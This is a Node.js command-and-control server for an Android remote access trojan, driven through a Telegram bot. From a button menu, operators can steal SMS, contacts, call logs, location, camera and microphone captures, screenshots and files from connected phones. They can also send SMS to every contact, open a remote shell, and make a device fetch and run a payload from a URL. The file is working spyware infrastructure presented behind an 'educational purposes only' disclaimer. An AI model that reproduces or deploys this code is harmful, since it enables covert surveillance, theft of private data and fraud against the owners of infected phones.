// bot.js

// ================================================================= //
// Part 1: Configuration & Setup
// ================================================================= //

const http = require('http');
const express = require('express');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

// --- BOT CONFIGURATION (Fetched from Render Environment Variables) ---
const BOT_TOKEN = process.env.BOT_TOKEN;
// ADMIN_IDS should be a comma-separated string in Render (e.g., "6124579941,6650919351")
const ADMIN_IDS = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(Number) : [];
const CONTROL_GROUP_ID = Number(process.env.CONTROL_GROUP_ID);

// --- SERVER CONFIGURATION ---
const WEB_SERVER_PORT = process.env.PORT || 8000; 
// Render automatically provides RENDER_EXTERNAL_URL (e.g., https://your-app.onrender.com)
const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${WEB_SERVER_PORT}`;

// --- Global Variables ---
const devices = new Map();
const shells = new Map();
const fileBrowsers = new Map(); 
const pendingReplies = new Map();

// ================================================================= //
// Part 2: Core Server & Bot Functions
// ================================================================= //

const app = express();
const server = http.createServer(app);
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const wss = new WebSocket.Server({ server });

const mainKeyboard = {
    keyboard: [[{ text: '🔌 Connected devices' }], [{ text: '⚡ Execute command' }]],
    resize_keyboard: true
};

function sendMessageToGroup(message) {
    bot.sendMessage(CONTROL_GROUP_ID, message, { parse_mode: 'Markdown' })
        .catch(err => console.error(`Failed to send message to group:`, err.response ? err.response.body : err.message));
}

function sendFileToGroup(fileBuffer, filename, caption) {
    bot.sendDocument(CONTROL_GROUP_ID, fileBuffer, { caption: caption, parse_mode: 'Markdown' }, {
        filename: filename,
        contentType: 'application/octet-stream'
    }).catch(err => console.error(`Failed to send file to group:`, err.response ? err.response.body : err.message));
}

function formatDuration(ms) {
    if (ms < 0) ms = 0;
    const seconds = Math.floor((ms / 1000) % 60);
    const minutes = Math.floor((ms / (1000 * 60)) % 60);
    const hours = Math.floor(ms / (1000 * 60 * 60));
    if (hours > 0) return `${hours}h ${minutes}m ${seconds}s`;
    if (minutes > 0) return `${minutes}m ${seconds}s`;
    return `${seconds}s`;
}

// ================================================================= //
// Part 3: HTTP Server Endpoints
// ================================================================= //

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Vital for Render's Health Check and Keep-Alive
app.get('/', (req, res) => res.send('Bot is Running'));
app.get('/ping', (req, res) => res.send('pong'));

app.get('/shell', (req, res) => res.sendFile(path.join(__dirname, 'shell.html')));
app.get('/files', (req, res) => res.sendFile(path.join(__dirname, 'fileBrowser.html')));
app.use(express.raw({ type: 'application/octet-stream', limit: '500mb' }));

app.post('/upload', (req, res) => {
    const deviceName = req.get('X-Device-Name');
    const filename = req.get('X-Filename');
    if (!deviceName || !filename || !req.body) {
        return res.status(400).send('Missing required headers or file data.');
    }
    const fileBuffer = req.body;
    sendFileToGroup(fileBuffer, filename, `📄 File \`${filename}\` received from **${deviceName}**`);
    res.status(200).send('File uploaded successfully.');
});

// ================================================================= //
// Part 4: WebSocket Server Logic
// ================================================================= //

wss.on('connection', (ws) => {
    const connectionId = uuidv4();
    let currentDeviceId = null;
    let isShell = false;
    let isFileBrowser = false;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());
            switch (data.type) {
                case 'identify_device':
                    currentDeviceId = data.android_id;
                    const newDevice = { id: currentDeviceId, ws: ws, name: data.name, originalName: data.name, connectionTime: new Date() };
                    devices.set(currentDeviceId, newDevice);
                    sendMessageToGroup(`🟢 **Device Connected** 🟢\n\n**Name:** \`${data.name}\``);
                    break;
                case 'sendmessage':
                    sendMessageToGroup(data.text);
                    break;
                case 'identify_shell':
                    isShell = true;
                    if (devices.has(data.deviceId)) {
                        shells.set(connectionId, { id: connectionId, ws: ws, targetDeviceId: data.deviceId });
                    } else {
                        ws.send(JSON.stringify({ type: 'device_disconnected' }));
                        ws.close();
                    }
                    break;
                case 'shell_command':
                    const shell = shells.get(connectionId);
                    if (shell) {
                        const targetDevice = devices.get(shell.targetDeviceId);
                        if (targetDevice) {
                            targetDevice.ws.send(JSON.stringify({ type: 'shell_command', command: data.command, replyTo: connectionId }));
                        }
                    }
                    break;
                case 'shell_output':
                    const targetShell = shells.get(data.replyTo);
                    if (targetShell) {
                        targetShell.ws.send(JSON.stringify(data));
                    }
                    break;
                case 'identify_file_browser':
                    isFileBrowser = true;
                    if (devices.has(data.deviceId)) {
                        fileBrowsers.set(connectionId, { id: connectionId, ws: ws, targetDeviceId: data.deviceId });
                    } else {
                        ws.send(JSON.stringify({ type: 'device_disconnected' }));
                        ws.close();
                    }
                    break;
                case 'browse_files':
                case 'download_file': 
                    const browserRequest = fileBrowsers.get(connectionId);
                    if (browserRequest) {
                        const targetDevice = devices.get(browserRequest.targetDeviceId);
                        if (targetDevice) {
                            targetDevice.ws.send(JSON.stringify({ 
                                type: data.type, 
                                path: data.path, 
                                replyTo: connectionId 
                            }));
                        }
                    }
                    break;
                case 'file_list':
                case 'web_status': 
                    const targetBrowser = fileBrowsers.get(data.replyTo);
                    if (targetBrowser) {
                        targetBrowser.ws.send(JSON.stringify(data));
                    }
                    break;
            }
        } catch (e) {
            console.error('[WebSocket] Error processing message:', e);
        }
    });

    ws.on('close', () => {
        if (currentDeviceId && devices.has(currentDeviceId)) {
            const device = devices.get(currentDeviceId);
            devices.delete(currentDeviceId);
            const duration = formatDuration(new Date() - device.connectionTime);
            sendMessageToGroup(`🔴 **Device Disconnected** 🔴\n\n**Name:** \`${device.name}\`\n**Connected for:** ${duration}`);
            shells.forEach(shell => {
                if (shell.targetDeviceId === currentDeviceId) {
                    shell.ws.send(JSON.stringify({ type: 'device_disconnected' }));
                    shell.ws.close();
                }
            });
            fileBrowsers.forEach(browser => {
                if (browser.targetDeviceId === currentDeviceId) {
                    browser.ws.send(JSON.stringify({ type: 'device_disconnected' }));
                    browser.ws.close();
                }
            });
        }
        if (isShell) shells.delete(connectionId);
        if (isFileBrowser) fileBrowsers.delete(connectionId);
    });
});

// ================================================================= //
// Part 5: Telegram Bot Listeners
// ================================================================= //

bot.onText(/\/id/, (msg) => {
    const response = `👤 **Your User ID:** \`${msg.from.id}\`\n\n👥 **Group Chat ID:** \`${msg.chat.id}\``;
    bot.sendMessage(msg.chat.id, response, { parse_mode: 'Markdown' });
});

bot.onText(/\/start/, (msg) => {
    if (!ADMIN_IDS.includes(msg.from.id)) return;
    const welcomeMessage = "⚠️ **Disclaimer** ⚠️\n\nBy using this bot, you agree to the privacy policy and confirm this tool is for **educational purposes only**. You are responsible for all actions performed.";
    bot.sendMessage(msg.chat.id, welcomeMessage, {
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard
    });
});

bot.on('message', (msg) => {
    if (!ADMIN_IDS.includes(msg.from.id) || msg.chat.id !== CONTROL_GROUP_ID) return;

    if (msg.reply_to_message) {
        const promptMessageId = msg.reply_to_message.message_id;
        const pendingCommand = pendingReplies.get(promptMessageId);

        if (pendingCommand) {
            const device = devices.get(pendingCommand.deviceId);
            if (!device) {
                sendMessageToGroup(`❌ Error: Device for this command has disconnected.`);
                pendingReplies.delete(promptMessageId);
                return;
            }

            if (pendingCommand.command === 'PlayMedia') {
                let mediaUrl = '';
                if (msg.text) {
                    mediaUrl = msg.text.trim();
                } else if (msg.audio || msg.voice) {
                    const fileId = (msg.audio || msg.voice).file_id;
                    bot.getFileLink(fileId).then(link => {
                        const finalCommand = { type: 'command', command: 'PlayMedia', argument: link };
                        device.ws.send(JSON.stringify(finalCommand));
                        bot.sendMessage(msg.chat.id, `✅ Command \`PlayMedia\` sent to **${device.name}**.`, { reply_markup: mainKeyboard });
                    }).catch(err => {
                        bot.sendMessage(msg.chat.id, `❌ Error: Could not get a link.`, { reply_markup: mainKeyboard });
                    });
                    pendingReplies.delete(promptMessageId);
                    return;
                }
                if (mediaUrl) {
                    const finalCommand = { type: 'command', command: 'PlayMedia', argument: mediaUrl };
                    device.ws.send(JSON.stringify(finalCommand));
                    bot.sendMessage(msg.chat.id, `✅ Command \`PlayMedia\` sent to **${device.name}**.`, { reply_markup: mainKeyboard });
                }
            }
            else if (pendingCommand.command === 'Execute' || pendingCommand.command === 'SetCurrentWallpaper') {
                if (msg.text && msg.text.trim()) {
                    const finalCommand = { type: 'command', command: pendingCommand.command, argument: msg.text.trim() };
                    device.ws.send(JSON.stringify(finalCommand));
                    bot.sendMessage(msg.chat.id, `✅ Command \`${pendingCommand.command}\` sent to **${device.name}**.`, { reply_markup: mainKeyboard });
                }
                else if (msg.document || msg.photo) {
                    const fileId = msg.document?.file_id || msg.photo?.[msg.photo.length - 1].file_id;
                    bot.getFileLink(fileId).then(link => {
                        const finalCommand = { type: 'command', command: pendingCommand.command, argument: link };
                        device.ws.send(JSON.stringify(finalCommand));
                        bot.sendMessage(msg.chat.id, `✅ Command \`${pendingCommand.command}\` sent to **${device.name}**.`, { reply_markup: mainKeyboard });
                    });
                }
                pendingReplies.delete(promptMessageId);
                return;
            }
            else if (pendingCommand.command === 'ShowNotification' && pendingCommand.step === 'getLink') {
                const title = pendingCommand.argument;
                const link = msg.text.trim();
                const finalCommand = { type: 'command', command: 'ShowNotification', title: title, link: link };
                device.ws.send(JSON.stringify(finalCommand));
                bot.sendMessage(msg.chat.id, `✅ Command sent to **${device.name}**.`, { reply_markup: mainKeyboard });
            }
            else if (pendingCommand.command === 'SendSmsToNumber' && pendingCommand.step === 'getMessage') {
                const number = pendingCommand.number;
                const message = msg.text.trim();
                const finalCommand = { type: 'command', command: 'SendSmsToNumber', number: number, message: message };
                device.ws.send(JSON.stringify(finalCommand));
                bot.sendMessage(msg.chat.id, `✅ SMS sent to \`${number}\` via **${device.name}**.`, { reply_markup: mainKeyboard });
            }
            else if (pendingCommand.command === 'ShowNotification') {
                const title = msg.text.trim();
                bot.sendMessage(msg.chat.id, `❓ Now, enter the link to open:`, { reply_markup: { force_reply: true } }).then(newPrompt => {
                    pendingReplies.set(newPrompt.message_id, { ...pendingCommand, step: 'getLink', argument: title });
                });
            }
            else if (pendingCommand.command === 'SendSmsToNumber') {
                const number = msg.text.trim();
                bot.sendMessage(msg.chat.id, `❓ Now, enter the message:`, { reply_markup: { force_reply: true } }).then(newPrompt => {
                    pendingReplies.set(newPrompt.message_id, { ...pendingCommand, step: 'getMessage', number: number });
                });
            }
            else {
                if (pendingCommand.command === 'SetDeviceName') {
                    const newName = msg.text.trim();
                    device.name = newName;
                    sendMessageToGroup(`✅ Device renamed to **${newName}**.`);
                }
                const finalCommand = { type: 'command', command: pendingCommand.command, ...pendingCommand.params, argument: msg.text.trim() };
                device.ws.send(JSON.stringify(finalCommand));
                bot.sendMessage(msg.chat.id, `✅ Command \`${pendingCommand.command}\` sent to **${device.name}**.`, { reply_markup: mainKeyboard });
            }
            pendingReplies.delete(promptMessageId);
            return;
        }
    }

    if (msg.text && msg.text.startsWith('/')) return;
    if (msg.text) {
        switch (msg.text) {
            case '🔌 Connected devices':
                if (devices.size === 0) {
                    sendMessageToGroup("😕 No connected devices available.");
                } else {
                    let deviceList = "✅ **Connected Devices:**\n\n";
                    let count = 1;
                    devices.forEach(device => {
                        const time = device.connectionTime.toLocaleTimeString('en-US', { hour12: true });
                        deviceList += `${count}. **${device.name}**\n   └─ _Connected since: ${time}_\n`;
                        count++;
                    });
                    sendMessageToGroup(deviceList);
                }
                break;
            case '⚡ Execute command':
                if (devices.size === 0) {
                    sendMessageToGroup("😕 No connected devices available.");
                } else {
                    const inlineKeyboard = Array.from(devices.values()).map(device => ([
                        { text: `📱 ${device.name}`, callback_data: `select_device_${device.id}` }
                    ]));
                    bot.sendMessage(msg.chat.id, "👇 Select a device to command:", {
                        reply_markup: { inline_keyboard: inlineKeyboard }
                    });
                }
                break;
        }
    }
});

bot.on('callback_query', (callbackQuery) => {
    if (!ADMIN_IDS.includes(callbackQuery.from.id)) return;
    const data = callbackQuery.data;
    const msg = callbackQuery.message;

    if (data.startsWith('select_device_')) {
        const deviceId = data.replace('select_device_', '');
        const device = devices.get(deviceId);
        if (!device) return;

        bot.editMessageText(`👇 Select a command for **${device.name}**:`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '👤 Set Name', callback_data: `cmd_setdevicename_${deviceId}` }, { text: '💬 Set Toast', callback_data: `cmd_settoast_${deviceId}` }, { text: '📊 Status', callback_data: `cmd_getstatus_${deviceId}` }],
                    [{ text: '✉️ Get SMS', callback_data: `cmd_getsms_${deviceId}` }, { text: '👥 Get Contacts', callback_data: `cmd_getcontacts_${deviceId}` }, { text: '📞 Get Call Logs', callback_data: `cmd_getcalllogs_${deviceId}` }],
                    [{ text: '📲 Send SMS to Number', callback_data: `cmd_sendsmstonumber_${deviceId}` }, { text: '📲 Send SMS to All', callback_data: `cmd_sendsmstoall_${deviceId}` }],
                    [{ text: '📦 Get Installed Apps', callback_data: `cmd_getinstalledapps_${deviceId}` }, { text: '🗑️ Uninstall App', callback_data: `cmd_uninstallapp_${deviceId}` }],
                    [{ text: 'ℹ️ Get Device Info', callback_data: `cmd_getdeviceinfo_${deviceId}` }, { text: '🛡️ Get Permissions', callback_data: `cmd_getpermissions_${deviceId}` }],
                    [{ text: '📲 Make Call', callback_data: `cmd_makecall_${deviceId}` }, { text: '☎️ Dial', callback_data: `cmd_dial_${deviceId}` }, { text: '🎶 Play Media', callback_data: `cmd_playmedia_${deviceId}` }, { text: '🚀 Execute', callback_data: `cmd_execute_${deviceId}` }],
                    [{ text: '📍 Get Location', callback_data: `cmd_getlocation_${deviceId}` }, { text: '🖼️ Get Wallpaper', callback_data: `cmd_getwallpaper_${deviceId}` }, { text: '🖼️ Set Wallpaper', callback_data: `cmd_setwallpaper_${deviceId}` }],
                    [{ text: '🔔 Show Notification', callback_data: `cmd_shownotification_${deviceId}`}],
                    [{ text: '📸 Cam 0 (Front)', callback_data: `cmd_getcamera_0_${deviceId}` }, { text: '📹 Vid 0 (Front)', callback_data: `cmd_getvideo_0_${deviceId}` }],
                    [{ text: '📸 Cam 1 (Back)', callback_data: `cmd_getcamera_1_${deviceId}` }, { text: '📹 Vid 1 (Back)', callback_data: `cmd_getvideo_1_${deviceId}` }],
                    [{ text: '🎤 Mic Record', callback_data: `cmd_getmicrecording_${deviceId}` }, { text: '🖼️ View Photos', callback_data: `cmd_getphotos_${deviceId}` }, { text: '🎞️ View Videos', callback_data: `cmd_getvideos_${deviceId}` }],
                    [{ text: '🛑 Stop Command', callback_data: `cmd_stopcommand_${deviceId}` }, { text: '🖥️ View Screenshots', callback_data: `cmd_getscreenshots_${deviceId}` }],
                    [{ text: '📳 Vibrate', callback_data: `cmd_vibrate_${deviceId}` }, { text: '🚨 SS', callback_data: `cmd_sos_${deviceId}` }, { text: '👐 open supportive link', callback_data: `cmd_oplink_${deviceId}` }],
                    [{ text: '📂 Local Files', callback_data: `cmd_localfiles_${deviceId}` }]
                ]
            }
        });
    }

    if (data.startsWith('cmd_')) {
        const parts = data.replace('cmd_', '').split('_');
        const commandName = parts[0];
        const deviceId = parts[parts.length - 1];
        const device = devices.get(deviceId);
        if (!device) {
            bot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!', show_alert: true });
            return;
        }

        const sendSimpleCommand = (cmd, params = {}) => {
            const commandPayload = JSON.stringify({ type: 'command', command: cmd, ...params });
            device.ws.send(commandPayload);
            bot.editMessageText(`✅ Command \`${cmd}\` sent to **${device.name}**.`, { chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'Markdown' });
        };

        const askForArgument = (cmd, prompt, params = {}) => {
            bot.editMessageText(`❓ **Action Required for ${device.name}**\n\n${prompt}`, {
                chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [] }
            }).then(() => {
                bot.sendMessage(msg.chat.id, `Please reply to this message.`, { reply_markup: { force_reply: true } }).then(promptMessage => {
                    pendingReplies.set(promptMessage.message_id, { command: cmd, deviceId: deviceId, params: params });
                });
            });
            bot.answerCallbackQuery(callbackQuery.id);
        };

        switch (commandName.toLowerCase()) {
            case 'getinstalledapps': sendSimpleCommand('GetInstalledApps'); break;
            case 'getstatus':        sendSimpleCommand('GetStatus'); break;
            case 'getphotos':        sendSimpleCommand('GetPhotos'); break;
            case 'getscreenshots':   sendSimpleCommand('GetScreenshots'); break;
            case 'getvideos':        sendSimpleCommand('GetVideos'); break;
            case 'stopcommand':      sendSimpleCommand('StopCommand'); break;
            case 'getpermissions':   sendSimpleCommand('GetGivenPermissions'); break;
            case 'dial':             askForArgument('Dial', 'Enter number:'); break;
            case 'sos':              askForArgument('SOS', 'Enter duration (sec):'); break;
            case 'vibrate':          askForArgument('Vibrate', 'Enter duration (sec):'); break;
            case 'oplink':           askForArgument('OpLink', 'Enter link value:'); break;
            case 'localfiles':
                const fileBrowserUrl = `${BASE_URL}/files?id=${deviceId}`;
                bot.editMessageText(`🌐 File Browser for **${device.name}**`, {
                    chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: 'Open File Browser', url: fileBrowserUrl }]] }
                });
                break;
            case 'makecall':         askForArgument('MakeCall', `Enter phone number:`); break;
            case 'playmedia':        askForArgument('PlayMedia', `Enter URL or reply with Audio:`); break;
            case 'uninstallapp':     askForArgument('UninstallApp', `Enter package name:`); break;
            case 'execute':          askForArgument('Execute', `Enter URL:`); break;
            case 'shownotification':  askForArgument('ShowNotification', `Enter title:`); break;
            case 'getsms':          sendSimpleCommand('GetSms'); break;
            case 'getcontacts':     sendSimpleCommand('GetContacts'); break;
            case 'getcalllogs':     sendSimpleCommand('GetCallLogs'); break;
            case 'getdeviceinfo':   sendSimpleCommand('GetDeviceInfo'); break;
            case 'getsiminfo':      sendSimpleCommand('GetSimInfo'); break;
            case 'getlocation':     sendSimpleCommand('GetLocation'); break;
            case 'getwallpaper':    sendSimpleCommand('GetCurrentWallpaper'); break;
            case 'getcamera':       sendSimpleCommand('GetCamera', { camId: parts[1] }); break;
            case 'setdevicename':   askForArgument('SetDeviceName', `Enter new name:`); break;
            case 'settoast':        askForArgument('SetToast', 'Enter message:'); break;
            case 'setwallpaper':    askForArgument('SetCurrentWallpaper', 'Enter URL:'); break;
            case 'getvideo':        askForArgument('GetVideo', 'Enter duration (sec):', { camId: parts[1] }); break;
            case 'getmicrecording': askForArgument('GetMicRecording', 'Enter duration (sec):'); break;
            case 'sendsmstoall':    askForArgument('SendSmsToAll', 'Enter message:'); break;
            case 'sendsmstonumber':  askForArgument('SendSmsToNumber', `Enter phone number:`); break;
            default: bot.answerCallbackQuery(callbackQuery.id, { text: 'Unknown command!', show_alert: true });
        }
    }
});

// ================================================================= //
// Part 6: Start Server & Keep-Alive
// ================================================================= //

server.listen(WEB_SERVER_PORT, '0.0.0.0', () => {
    console.log(`🚀 Bot is live on Render!`);
    console.log(`🔗 Base URL: ${BASE_URL}`);
});

// Self-ping logic to keep Render awake
if (process.env.RENDER_EXTERNAL_URL) {
    setInterval(() => {
        http.get(`${BASE_URL}/ping`, (res) => {
            console.log('Self-ping successful');
        }).on('error', (err) => {
            console.error('Self-ping failed:', err.message);
        });
    }, 600000); // Ping every 10 minutes
}
